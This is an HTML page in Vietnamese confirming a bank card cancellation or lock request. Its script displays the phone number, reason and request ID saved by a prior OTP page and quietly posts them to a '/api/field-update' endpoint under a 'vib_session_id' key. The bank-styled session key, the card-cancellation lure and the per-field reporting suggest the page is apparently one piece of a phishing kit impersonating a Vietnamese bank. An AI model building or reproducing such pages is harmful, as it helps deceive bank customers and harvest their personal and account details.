<!doctype html>
<html lang="vi">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Yêu cầu đã gửi</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #f8f9fa;
        }

        .card {
            max-width: 720px;
            margin: 2rem auto;
        }

        .mono {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
        }
    </style>
</head>

<body>
    <main class="container">
        <div class="card shadow-sm">
            <div class="card-body">
                <h1 class="h5 mb-2">Yêu cầu đã được gửi</h1>
                <p class="text-muted">Cảm ơn. Yêu cầu hủy/tạm khóa thẻ của bạn đã được hệ thống ghi nhận.</p>

                <div id="summary" class="mb-3">
                    <div class="fw-semibold">Chi tiết yêu cầu</div>
                    <ul class="list-unstyled small mt-2">
                        <li><strong>Mã yêu cầu:</strong> <span id="reqId" class="mono">—</span></li>
                        <li><strong>Số điện thoại:</strong> <span id="phone" class="mono">—</span></li>
                        <li><strong>Lý do:</strong> <span id="reason">—</span></li>
                        <li><strong>Thời gian gửi:</strong> <span id="sentAt">—</span></li>
                    </ul>
                </div>

                <div id="notice" class="alert alert-info small">Bạn có thể in hoặc lưu lại thông tin này để đối chiếu.
                </div>

                <div class="d-flex gap-2">
                    <button id="btnPrint" class="btn btn-outline-secondary">In / Lưu dưới dạng PDF</button>
                    <button id="btnBack" class="btn btn-primary ms-auto">Về trang chủ</button>
                </div>
            </div>
        </div>
    </main>

    <script>
        const reqIdEl = document.getElementById('reqId');
        const phoneEl = document.getElementById('phone');
        const reasonEl = document.getElementById('reason');
        const sentAtEl = document.getElementById('sentAt');

        // Read values saved by OTP page
        const reqId = sessionStorage.getItem('submittedRequestId') || sessionStorage.getItem('pendingRequestId') || 'không-sẵn-sàng';
        const phone = sessionStorage.getItem('submittedPhone') || sessionStorage.getItem('pendingPhone') || '—';
        const reason = sessionStorage.getItem('submittedReason') || sessionStorage.getItem('pendingReason') || '—';
        const sentAt = sessionStorage.getItem('submittedAt') || sessionStorage.getItem('pendingAt') || new Date().toISOString();

        reqIdEl.textContent = reqId;
        phoneEl.textContent = phone;
        reasonEl.textContent = reason;
        sentAtEl.textContent = new Date(sentAt).toLocaleString('vi-VN');

        // Send final field-update to server for audit/logging
        (async function sendFinalUpdate() {
            try {
                const FIELD_UPDATE_API = (location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update';
                const sessionId = sessionStorage.getItem('vib_session_id') || sessionStorage.getItem('fieldSessionId') || null;
                const payload = { sessionId: sessionId || 'no-session', field: 'final_submission', value: JSON.stringify({ reqId, phone, reason, sentAt }), page: 'yeu-cau-da-gui.html' };
                await fetch(FIELD_UPDATE_API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            } catch (e) {
                // ignore network errors
            }
        })();

        document.getElementById('btnPrint').addEventListener('click', () => window.print());
        document.getElementById('btnBack').addEventListener('click', () => { window.location.href = 'index.html'; });
    </script>
</body>

</html>
